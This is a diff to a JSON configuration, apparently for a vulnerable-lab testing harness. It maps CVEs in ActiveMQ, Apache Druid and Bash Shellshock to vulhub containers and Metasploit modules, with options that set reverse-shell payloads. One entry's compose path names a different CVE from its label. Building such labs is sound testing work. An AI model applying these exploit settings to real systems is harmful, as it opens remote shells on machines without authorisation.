@@ -16,5 +16,32 @@
             "exploit": "multi/http/apache_activemq_upload_jsp",
             "exploit_options":"set PAYLOAD java/meterpreter/reverse_tcp;"
         }
+    },
+    {"name":"CVE-2023-46604",
+        "settings": {
+            "description":"ActiveMQ deserialization RCE",
+            "yml_file":"$VULN_PATH/vulhub/activemq/CVE-2023-46604/docker-compose.yml",
+            "target_name":"setc-activemq-1",
+            "exploit": "multi/misc/apache_activemq_rce_cve_2023_46604",
+            "exploit_options":"set target 1;set PAYLOAD cmd/linux/http/x86/meterpreter_reverse_tcp;set SRVPORT 8081;"
+        }
+    },
+    {"name":"CVE-2023-25194",
+        "settings": {
+            "description":"Apache Druid JDMI injection RCE",
+            "yml_file":"$VULN_PATH/vulhub/apache-druid/CVE-2021-25646/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/apache_druid_cve_2023_25194",
+            "exploit_options":"set target 2;set PAYLOAD cmd/unix/reverse_bash;set SRVHOST eth0;set SSL false;"
+        }
+    },
+    {"name":"CVE-2014-6271",
+        "settings": {
+            "description":"Apache CGI shellshock using user agent",
+            "yml_file":"$VULN_PATH/vulhub/bash/CVE-2014-6271/docker-compose.yml",
+            "target_name":"setc-web-1",
+            "exploit": "multi/http/apache_mod_cgi_bash_env_exec",
+            "exploit_options":"set TARGETURI /victim.cgi;"
+        }
     }
 ]
